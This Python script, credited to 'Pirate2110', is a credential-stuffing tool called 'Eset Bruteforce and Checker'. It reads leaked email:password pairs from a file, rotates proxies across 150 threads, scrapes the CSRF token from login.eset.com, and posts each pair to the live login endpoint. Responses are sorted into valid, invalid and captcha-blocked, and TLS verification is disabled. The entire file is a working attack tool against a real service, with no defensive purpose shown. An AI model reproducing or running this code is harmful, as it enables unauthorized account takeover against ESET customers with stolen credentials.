import requests
import sys, os
import random
import datetime
import threading
import time
from helpers.colors import bcolors
from bs4 import BeautifulSoup as soup

from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)



class Brute(object):
    def __init__(self):
        self.projectName = "Eset"
        self.projectFullName = "Eset Bruteforce and Checker"
        self.description = "Author : Pirate2110"
        self.good = 0
        self.bad = 0 
        self.error = 0
        self.projerror = 0
        self.projid = 0
        self.proxylink = ""
        self.prlines = []
        self.proxytype = "https"
        self.basename = "log.txt"
        self.proxyname = "proxy.txt"
        self.captcha = 0
        self.running = True
        self.timeout = 15
        self.thread_count = 150
        self.today = datetime.datetime.today()
        self.lines = []
        self.lock = threading.Lock()
        self.count_list = 0

    def check(self, login, password):
        try:
            pr = self.getproxy()
            if self.proxytype != "burp":
                proxies = {'https': self.proxytype +  "://" + pr, 'http': self.proxytype +  "://" + pr}
            else:
                proxies = {'https': '127.0.0.1:8080', 'http': '127.0.0.1:8080'}
            
            #print(proxies)
            headers = {'User-Agent' : 'Mozilla/5.0 (Linux; Android 6.0.1; Moto G (4)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Mobile Safari/537.36'}
            s = requests.session()
            r = s.get("https://login.eset.com/Login/Index", proxies=proxies, verify=False, timeout=self.timeout, headers=headers)
            site = soup(r.text, "html.parser")
            token = site.find("input", {"name":"__RequestVerificationToken"})['value']
            url = site.find("input", {"name":"ReturnUrl"})['value']
            body = "Email=" + login + "&Password=" + password + "&__RequestVerificationToken=" + token + "&ReturnUrl=" + url 
            headers = {
                'User-Agent' : 'Mozilla/5.0 (Linux; Android 6.0.1; Moto G (4)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Mobile Safari/537.36',
                'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Upgrade-Insecure-Requests': '1'
            }
            r = s.post("https://login.eset.com/Login/Login", data=body, proxies=proxies, verify=False, timeout=self.timeout, headers=headers, allow_redirects=False)
            
            if "the service is not available" in r.text:
                self.captcha += 1
                self.lines.append(login+':'+password)
            elif r.status_code == 302:
                if "authorize" in r.headers['Location']:
                    self.bad += 1
                else:
                    self.writelog("projerr.txt", login + ":" + password + "|" + str(r.headers['Location']))
                    self.projerror += 1
            else:
                self.writelog("projerr.txt", login + ":" + password + "|" + str(r.headers['Location']))
                self.projerror += 1
        except Exception as e:
            exc_type, exc_obj, exc_tb = sys.exc_info()
            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
            #print(exc_type, fname, exc_tb.tb_lineno)
            self.error += 1
            self.lines.append(login+':'+password)
     
    def stop(self):
        self.running = False
        print("Work ended", end='\r')
        sys.stdout.flush()

   



    def mult(self):
        
        with open(self.basename, "r") as tags:
            for line in tags:
                #print(bcolors.WARNING + '[+] Start scanning : ' + line.strip() + bcolors.ENDC)
                self.lines.append(line.strip())
            print('Count of accounts : ' + str(len(self.lines)))  
        self.count_list = len(self.lines) 
        if "http" in self.proxylink:
            ptt = threading.Thread(target=self.updateProxyLink)
            ptt.start()
        else:
            with open(self.proxyname, "r") as tags:
                for line in tags:
                    #print(bcolors.WARNING + '[+] Start scanning : ' + line.strip() + bcolors.ENDC)
                    self.prlines.append(line.strip())
                print('Count of proxies : ' + str(len(self.lines))) 
            
        self.startth()

    def startth(self):
        for i in range(self.thread_count):
            t = threading.Thread(target=self.work)
            t.start()

    def updateProxyLink(self):
        print("updating")
        while self.running:
            r = requests.get(self.proxylink, verify=False)
            
            self.prlines.clear()
            for line in r.text.split('\r\n'):
                self.prlines.append(line)
            time.sleep(10)
    def work(self):
    #print(bcolors.WARNING + '[+] Start scanning : ' + str(self.lines[0]) + bcolors.ENDC)
        while self.running:
            if (len(self.lines) == 0):
                self.stop()
                break

            self.lock.acquire()
            if self.projid == 0:
                print( str(len(self.lines)) + "/" + str(self.count_list) + " (" + str(len(self.lines)  // (self.count_list/ 100)) + "%) " +bcolors.OKGREEN + str(self.good) + bcolors.ENDC   + "/" + bcolors.FAIL + str(self.bad) + bcolors.ENDC + "/"  + bcolors.WARNING+ str(self.error) + bcolors.ENDC + "/"  + bcolors.UNDERLINE+ str(self.projerror) + bcolors.ENDC + "/"  + bcolors.BOLD+ str(self.captcha) + bcolors.ENDC + " [" + str(threading.active_count()) + "]", end='\r')
            sys.stdout.flush()
            trl = self.lines[0]
            self.lines.pop(0)
            self.lock.release()

            if ":" in trl:
                self.check(trl.split(':')[0], trl.split(':')[1])
            if ";" in trl:
                self.check(trl.split(';')[0], trl.split(';')[1])
            
            time.sleep(1)
        self.exit_thread()

    def exit_thread(self):
        self.lock.acquire()
        self.thread_count -= 1
        self.lock.release()

    def getproxy(self):
        return random.choice(self.prlines)

    def writelog(self, file, log):
        dirr = self.projectName + "/" + str(self.today.strftime("%m-%d-%H.%M.%S")) + "/" +file
        os.makedirs(os.path.dirname(dirr), exist_ok=True)
        with open(dirr, 'a') as the_file:
            the_file.write(log + '\n')